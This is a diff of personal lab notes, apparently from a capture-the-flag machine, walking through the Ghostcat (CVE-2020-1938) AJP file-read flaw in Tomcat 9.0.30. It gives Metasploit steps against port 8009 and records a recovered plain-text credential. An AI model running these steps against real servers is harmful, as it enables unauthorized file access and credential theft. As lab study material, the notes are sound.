@@ -1,18 +1,31 @@
-## 1) Quick background (why this works)
+## Web Server
+
+#Attacking_machine
+Visit `http://<MACHIINE IP>:8080/`
+
+![[Screenshot_2025-10-16_05-01-09.png]]
+
+## Vulnerabilities
+### 1) Quick background (why this works)
 
 - The AJP connector (default port **8009**) in Tomcat can be abused (Ghostcat, **CVE-2020-1938**) to read files from webapps or even cause file inclusion in some setups. Tomcat **9.0.30** is in the vulnerable range. [Medium+2sonatype.com+2](https://medium.com/%40sushantkamble/apache-ghostcat-cve-2020-1938-explanation-and-walkthrough-23a9a1ae4a23?utm_source=chatgpt.com)
     
 
 ---
 
-## 2) Confirm vulnerability (enumeration)
+### 2) Confirm vulnerability (enumeration)
 
 You already have `Apache Tomcat/9.0.30` from your scan — that matches known vulnerable versions. 
 
-## 3) Read files via AJP (file read) — common approach
+### 3) Read files via AJP (file read) — common approach
 
 Metasploit includes modules to interact with AJP/Ghostcat:
 
+Configuration options:
+
+![[Screenshot_2025-10-16_04-52-48.png]]
+
+Run:
 ```
 msfconsole
 # then:
@@ -21,3 +34,9 @@ set RHOSTS <TARGET_IP>
 set RPORT 8009
 run
 ```
+
+![[Screenshot_2025-10-16_04-54-50.png]]
+
+You have credentials: `webdev:Hgj3LA$02D$Fa@21`
+
+**Next step:** [[Ghostcat exploit]]
